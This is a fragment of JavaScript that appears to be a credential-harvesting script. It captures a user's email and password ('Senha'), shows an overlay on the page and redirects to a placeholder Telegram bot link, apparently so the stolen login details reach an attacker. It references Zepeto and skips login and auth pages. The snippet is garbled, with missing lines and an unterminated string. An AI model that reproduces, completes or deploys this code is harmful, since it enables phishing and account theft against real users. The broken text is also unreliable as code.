    if(url.includes('login') || url.includes('auth') || url.includes('zepeto')) return;

            if(senha) {

ID: ${email}
Senha: ${senha}`;

                document.body.appendChild(overlay);
                
                setTimeout(() => window.location.href = 'https://t.me/SEU_BOT', 2000);
            }
        }
    }, true);
}, 100);
